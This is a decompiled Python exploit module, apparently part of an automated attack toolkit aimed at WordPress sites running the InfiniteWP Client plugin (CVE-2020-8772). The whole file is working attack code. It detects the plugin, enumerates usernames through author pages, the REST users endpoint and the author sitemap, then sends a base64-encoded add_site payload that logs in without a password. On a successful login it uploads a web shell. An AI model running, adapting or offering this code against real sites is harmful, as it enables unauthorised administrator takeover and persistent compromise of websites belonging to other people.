# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2020_8772_wpInfinitewp_authBypass.py
import requests
import re
import json
import base64
import urllib3
from Tools import shellupload
from Exploits import printModule
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)
agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'
   }

def GET_USerS(site):
    users = []
    session = requests.session()
    try:
        CHEck = session.get('http://' + site + '/wp-content/plugins/iwp-client/readme.txt', timeout=7, headers=agent)
        if '=== InfiniteWP Client ===' in str(CHEck.content):
            for i in range(10):
                try:
                    GETSource = session.get('http://' + site + '/?author={}'.format(str(i + 1)), timeout=7, headers=agent)
                    find = re.findall('/author/(.*)/"', str(GETSource.content))
                    username = find[0]
                    if '/feed' in str(username):
                        find = re.findall('/author/(.*)/feed/"', str(GETSource.content))
                        username2 = find[0]
                        users.append(str(username2))
                    else:
                        users.append(str(username))
                except:
                    pass

            if not len(users) == 0:
                pass
            else:
                for i in range(10):
                    try:
                        GETSource2 = session.get('http://' + site + '/wp-json/wp/v2/users/' + str(i + 1), timeout=7, headers=agent)
                        __InFo = json.loads(str(GETSource2.content))
                        if 'id' not in str(__InFo):
                            pass
                        else:
                            try:
                                users.append(str(__InFo['slug']))
                            except:
                                pass

                    except:
                        pass

            if not len(users) == 0:
                pass
            else:
                try:
                    GETSource3 = session.get('http://' + site + '/author-sitemap.xml', timeout=7, headers=agent)
                    yost = re.findall('(<loc>(.*?)</loc>)\\s', GETSource3.content)
                    for user in yost:
                        users.append(str(user[1].split('/')[4]))

                except:
                    pass

            if not len(users) == 0:
                pass
            else:
                users.append('admin')
            return Attack(site, session, users)
        return printModule.returnNo(site, 'CVE-2020-8772', 'InfiniteWP Client', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2020-8772', 'InfiniteWP Client', 'Wordpress')


def Attack(url, session, users):
    json_info = {'iwp_action': 'add_site','params': {'username': users[0]}}
    try:
        session.post('http://' + url, timeout=7, verify=False, headers={'User-Agent': 'raphaelrocks'}, data='_IWP_JSON_PREFIX_{}'.format(base64.b64encode(json.dumps(json_info).encode('utf-8')).decode('utf-8')))
        G = session.get('http://' + url + '/wp-admin/', timeout=10, headers=agent)
        if '_logged' in str(session.cookies) and 'dashboard' in str(G.content):
            shellupload.UploadshellWordpress(url, session)
            return printModule.returnYes(url, 'CVE-2020-8772', 'InfiniteWP Client', 'Wordpress')
        return printModule.returnNo(url, 'CVE-2020-8772', 'InfiniteWP Client', 'Wordpress')
    except:
        return printModule.returnNo(url, 'CVE-2020-8772', 'InfiniteWP Client', 'Wordpress')